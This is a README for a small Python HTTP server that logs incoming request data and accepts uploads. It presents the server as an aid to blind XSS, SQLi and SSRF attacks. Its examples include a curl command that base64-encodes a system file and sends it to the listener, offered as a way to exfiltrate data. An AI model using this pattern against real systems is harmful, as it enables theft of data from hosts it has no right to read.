# simple-http-server
A simple extension of Python's http.server module. Serves files in the local directory, but also prints request data to the host. Can also be used for file transfer.

This utility makes an excellent companion to any kind of "blind" web-based attack, including XSS, SQLi, SSRF, etc

## Instructions

Clone the repo:
```bash
git clone https://github.com/4wayhandshake/simple-http-server.git
```

Make it executable:
```bash
cd simple-http-server
chmod +x SimpleServer.py
```

Run it, optionally specify a port:
```bash
./SimpleServer.py port [-v] [-h]
```

> `-v, --verbose` : enables verbose mode. This allows you to see all request headers. 
> `-h, --help` : show the help text

If you need quick and easy index page, just use **index.html** and **style.css** from this repo.

>:warning: Note: there is a special query string parameter: `b64`
>
>If you send base64-encoded data via a GET request using that query parameter, the server will automatically decode the data. This feature is very useful for out-of-band data exfiltration. Please see the base-64 entry under [Examples](#examples) for more details.

## Examples

> The following are just normal cURL commands, but might be handy reminders:

**Download** a file adjacent to the server:

```bash
curl http://127.0.0.1:8000/my_script.js
```

**Send data** in x-www-urlencoded format:

```bash
curl -d 'field=value&field2=value2' http://127.0.0.1:8000
```

**Upload** a file to the server:

```bash
curl -X POST -F "file=@./beaver.jpg" http://127.0.0.1:8000
```

Send **base-64 data** and have it automatically decoded:

```bash
curl http://127.0.0.1:8000?b64=$(cat /etc/hosts | base64 -w 0)
```



Please :star: this repo if you found it useful!


---

Enjoy,

:handshake::handshake::handshake::handshake:
@4wayhandshake
